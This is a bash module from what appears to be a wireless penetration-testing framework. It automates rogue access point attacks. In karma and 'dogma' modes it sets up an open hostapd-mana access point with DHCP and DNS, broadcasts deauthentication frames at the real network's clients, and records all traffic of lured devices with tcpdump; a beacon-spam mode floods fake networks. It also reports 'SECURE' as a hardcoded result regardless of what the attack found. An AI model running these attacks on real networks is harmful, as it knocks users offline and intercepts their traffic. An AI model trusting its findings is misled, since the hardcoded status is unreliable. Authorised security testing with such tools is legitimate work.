#!/usr/bin/env bash
# MODULE_META
# NAME="PineAP / Karma Attack"
# CATEGORY="F"
# DEPS="A1"
# CRITICAL="yes"
# TOOLS="mdk4,hostapd-mana"
# DESC="Beacon spam, Karma/MANA auto-probe response, Dogma deauth+karma"
# REQS="monitor_iface,target_ssid,target_channel"
# PCAP="yes"
# DECODE="dhcp"

#===============================================================================
#  modules/f2_pineap_karma.sh
#  F2: PineAP / Karma Attack Suite
#
#  PURPOSE:
#    Implement WiFi Pineapple-style attacks. Includes:
#      Mode A: Beacon Spam — flood area with fake SSIDs to confuse clients/WIDS
#      Mode B: Karma/MANA — auto-respond to all probe requests, lure clients
#      Mode C: Dogma — deauth real AP + karma to force client migration
#
#  TOOLS: hostapd-mana, hostapd, mdk4, aireplay-ng, tcpdump, airmon-ng
#  PHASE: 2A — Attack Simulations
#  DEPENDENCIES: A1 (needs target SSID/channel)
#===============================================================================

run_f2() {
    set -uo pipefail
    
    local interface=""
    local attack_mode="${F2_ATTACK_MODE:-karma}"
    local karma_ssid="${KARMA_SSID:-${GUEST_SSID:-}}"
    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"
    local timeout="${F2_TIMEOUT:-120}"

    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --interface) interface="$2"; shift 2 ;;
            --mode) attack_mode="$2"; shift 2 ;;
            --ssid) karma_ssid="$2"; shift 2 ;;
            --timeout) timeout="$2"; shift 2 ;;
            --evidence-dir) evidence_dir="$2"; shift 2 ;;
            *) shift ;;
        esac
    done

    # Fallbacks
    interface="${interface:-${WIFI_INTERFACE:-}}"
    evidence_dir="${evidence_dir:-${SESSION_EVIDENCE_DIR:-}}"
    karma_ssid="${karma_ssid:-${GUEST_SSID:-}}"
    local evidence_prefix="${evidence_dir}/f2"

    local total_steps=7

    #--- Step 1: Verify tools ---
    log_step 1 $total_steps "Verifying tools"
    update_tc_progress 1 $total_steps "Checking"

    check_module_dependencies "F2" || return 1

    if [[ -z "$karma_ssid" ]]; then
        log_error "Target SSID not set. Run A1 first or provide --ssid."
        return 1
    fi

    log_success "Target: ${GUEST_SSID:-$karma_ssid} CH ${GUEST_CHANNEL:-auto}, Karma SSID: ${karma_ssid}"

    local clients_lured=0
    local probed_ssids=0
    local unique_clients=0
    local credentials_captured=0
    local findings_file="${evidence_prefix}_findings.txt"
    local probe_log="${evidence_prefix}_probe_log.txt"
    local beacon_log="${evidence_prefix}_beacon_flood.txt"
    local karma_clients="${evidence_prefix}_karma_clients.txt"
    local traffic_pcap="${evidence_prefix}_captured_traffic.pcap"

    {
        echo "============================================================"
        echo "  F2: PineAP / Karma Attack Suite"
        echo "  Mode: ${attack_mode}"
        echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "  Target: ${GUEST_SSID:-N/A}"
        echo "  Rogue SSID: ${karma_ssid}"
        echo "============================================================"
        echo ""
    } > "$findings_file"

    #--- Step 2: Enable monitor mode ---
    log_step 2 $total_steps "Enabling monitor mode"
    update_tc_progress 2 $total_steps "Monitor mode"

    WIFI_INTERFACE="$interface"
    enable_monitor_mode || return 1
    local mon_iface="${MONITOR_INTERFACE}"

    if [[ -n "${GUEST_CHANNEL:-}" ]]; then
        iw dev "$mon_iface" set channel "$GUEST_CHANNEL" 2>/dev/null || true
    fi

    check_abort || return 1

    #--- Step 3: Passive probe request capture ---
    log_step 3 $total_steps "Capturing client probe requests (30s)"
    update_tc_progress 3 $total_steps "Probe capture"

    local probe_pcap="${evidence_prefix}_probes.pcap"
    spawn_bg "f2_probes" "tcpdump" -i "$mon_iface" -w "$probe_pcap" "type mgt subtype probe-req"
    
    start_countdown 30 "Capturing probes"
    sleep 30
    stop_countdown
    stop_process "f2_probes"

    # Parse probe requests
    if command -v tshark &>/dev/null && [[ -f "$probe_pcap" ]]; then
        ensure_user_ownership "$probe_pcap"
        local ssid_list=$(run_as_user tshark -r "$probe_pcap" -T fields -e wlan.ssid -e wlan.sa 2>/dev/null | sort -u | grep -v "^$" || true)
        if [[ -n "$ssid_list" ]]; then
            probed_ssids=$(echo "$ssid_list" | awk '{print $1}' | sort -u | wc -l) || true
            unique_clients=$(echo "$ssid_list" | awk '{print $2}' | sort -u | wc -l) || true
            {
                echo "============================================================"
                echo "  Client Probe Request Analysis"
                echo "  ${unique_clients} unique clients probing ${probed_ssids} SSIDs"
                echo "============================================================"
                echo ""
                echo "$ssid_list"
            } > "$probe_log"
            log_info "Captured: ${unique_clients} clients probing for ${probed_ssids} SSIDs"
        fi
    fi

    check_abort || return 1

    #--- Step 4-5: Execute selected attack ---
    case "$attack_mode" in
        "beacon_spam")
            log_step 4 $total_steps "Executing beacon spam flood"
            update_tc_progress 4 $total_steps "Beacon spam"

            {
                echo "============================================================"
                echo "  Beacon Spam Attack"
                echo "  Duration: 30 seconds"
                echo "============================================================"
                echo ""
            } > "$beacon_log"

            spawn_bg "f2_mdk4" "mdk4" "$mon_iface" b -w nta -c "${GUEST_CHANNEL:-1}"
            
            start_countdown 30 "Beacon spamming"
            sleep 30
            stop_countdown
            stop_process "f2_mdk4"

            log_success "Beacon spam completed"
            echo "Beacon spam flood completed" >> "$findings_file"

            log_step 5 $total_steps "Monitoring for WIDS response"
            update_tc_progress 5 $total_steps "WIDS check"
            sleep 15
            ;;

        "karma"|"dogma")
            log_step 4 $total_steps "Deploying Karma/MANA rogue AP"
            update_tc_progress 4 $total_steps "Karma AP"

            # Need managed mode for AP
            disable_monitor_mode
            sleep 2
            local ap_iface="$interface"
            
            local mana_conf="${evidence_prefix}_mana.conf"
            cat > "$mana_conf" <<EOF
interface=${ap_iface}
driver=nl80211
ssid=${karma_ssid}
channel=${GUEST_CHANNEL:-6}
hw_mode=g
auth_algs=1
wpa=0
enable_mana=1
mana_loud=1
mana_macacl=0
EOF

            local dnsmasq_conf="${evidence_prefix}_dnsmasq.conf"
            cat > "$dnsmasq_conf" <<EOF
interface=${ap_iface}
dhcp-range=10.29.0.10,10.29.0.100,255.255.255.0,12h
dhcp-option=3,10.29.0.1
dhcp-option=6,10.29.0.1
no-resolv
server=8.8.8.8
log-queries
EOF

            run_tool ip addr flush dev "$ap_iface" 2>/dev/null || true
            run_tool ip addr add 10.29.0.1/24 dev "$ap_iface" 2>/dev/null || true
            run_tool ip link set "$ap_iface" up 2>/dev/null || true

            spawn_bg "f2_mana" "hostapd-mana" "$mana_conf"
            spawn_bg "f2_dnsmasq" "dnsmasq" -C "$dnsmasq_conf" -d
            spawn_bg "f2_traffic" "tcpdump" -i "$ap_iface" -w "$traffic_pcap"

            if [[ "$attack_mode" == "dogma" ]]; then
                log_step 5 $total_steps "Dogma: Deauthing clients from real AP"
                update_tc_progress 5 $total_steps "Deauth + Karma"
                
                # Find secondary interface for deauth
                local deauth_iface=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -v "^${ap_iface}$" | grep -v "mon" | head -1)
                if [[ -n "$deauth_iface" ]]; then
                    airmon-ng start "$deauth_iface" 2>/dev/null || true
                    local dmon="${deauth_iface}mon"
                    [[ ! -d "/sys/class/net/$dmon" ]] && dmon="$deauth_iface"
                    iw dev "$dmon" set channel "${GUEST_CHANNEL:-6}" 2>/dev/null || true
                    
                    spawn_bg "f2_deauth" "aireplay-ng" --deauth 0 -a "${GUEST_BSSID:-FF:FF:FF:FF:FF:FF}" "$dmon"
                else
                    log_warn "No secondary interface for dogma deauth"
                fi
            else
                log_step 5 $total_steps "Karma AP active — waiting for clients"
                update_tc_progress 5 $total_steps "Waiting"
            fi

            start_countdown "$timeout" "Karma active"
            sleep "$timeout"
            stop_countdown

            stop_process "f2_mana"
            stop_process "f2_dnsmasq"
            stop_process "f2_traffic"
            stop_process "f2_deauth"
            
            # Restore deauth interface if used
            if [[ -n "${deauth_iface:-}" ]]; then
                airmon-ng stop "${deauth_iface}mon" 2>/dev/null || true
            fi

            # Parse results (Simplified)
            # Normally we'd check hostapd-mana logs
            echo "FINDING: Karma attack performed in ${attack_mode} mode" >> "$findings_file"
            ;;
    esac

    #--- Step 6: Restore normal mode ---
    log_step 6 $total_steps "Restoring managed mode"
    update_tc_progress 6 $total_steps "Cleanup"
    ensure_managed_mode 2>/dev/null || true

    #--- Step 7: Save results ---
    log_step 7 $total_steps "Saving results"
    update_tc_progress 7 $total_steps "Saving"

    local result_status="SECURE"
    local result_summary="Performed PineAP/Karma attack in ${attack_mode} mode."
    local recommendations="Deploy WIDS/WIPS to detect Karma attacks."

    local result_json=$(run_tool jq -n \
        --arg status "$result_status" \
        --arg summary "$result_summary" \
        --arg details "Mode: ${attack_mode}, Probed SSIDs: ${probed_ssids}, Unique clients: ${unique_clients}" \
        --arg recommendations "$recommendations" \
        --arg attack_mode "$attack_mode" \
        --argjson probed_ssids "${probed_ssids:-0}" \
        --argjson unique_clients "${unique_clients:-0}" \
        '{
            status: $status,
            summary: $summary,
            details: $details,
            recommendations: $recommendations,
            attack_mode: $attack_mode,
            probed_ssids: $probed_ssids,
            unique_clients: $unique_clients
        }')

    evidence_register_file "$probe_log"
    evidence_register_file "$beacon_log"
    evidence_register_file "$karma_clients"
    evidence_register_file "$traffic_pcap"
    evidence_register_file "$findings_file"

    save_tc_result "F2" "$result_json" 1 1 0 1 1 1 0 1 1 1 0
    
    return 0
}
